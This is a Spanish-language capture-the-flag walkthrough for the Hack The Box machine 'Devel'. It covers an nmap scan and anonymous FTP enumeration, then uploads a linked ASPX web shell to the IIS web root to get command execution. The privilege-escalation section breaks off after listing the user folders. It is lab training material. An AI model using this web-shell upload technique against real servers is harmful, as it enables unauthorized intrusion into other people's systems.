# Devel ![Avatar](https://www.hackthebox.eu/storage/avatars/0fb6455a29eb4f2682f04a780ce26cb1_thumb.png)     

### Initial Scan

```nmap
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```
### Enumeration

####FTP

Empecemos enumerando el FTP
```bash
pj@crow-foot:~$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:pj): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> cd aspnet_client
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```
Vemos que lo que tenemos es el directorio de la pagina que hay en el puerto 80, puede que podamos subir una shell

### Exploit

Usaremos una shell aspx por que es un cliente aspnet
```
https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/laudanum-0.8/aspx/shell.aspx
```
La descargamos y la subimos al FTP
```ftp
put shell.aspx
```
Y accedmos a http://10.10.10.5/shell.aspx

### Privesc

Ya tenemos shell en la máquina

#### Enumeración de Usuarios

```
 Directory of C:\Users

18/03/2017  02:16 §£    <DIR>          .
18/03/2017  02:16 §£    <DIR>          ..
18/03/2017  02:16 §£    <DIR>          Administrator
17/03/2017  05:17 ££    <DIR>          babis
18/03/2017  02:06 §£    <DIR>          Classic .NET AppPool
14/07/2009  10:20 §£    <DIR>          Public
```
No tenemos acceso a ninguno pero sabemos que los usuarios con flag son babis y Administrator
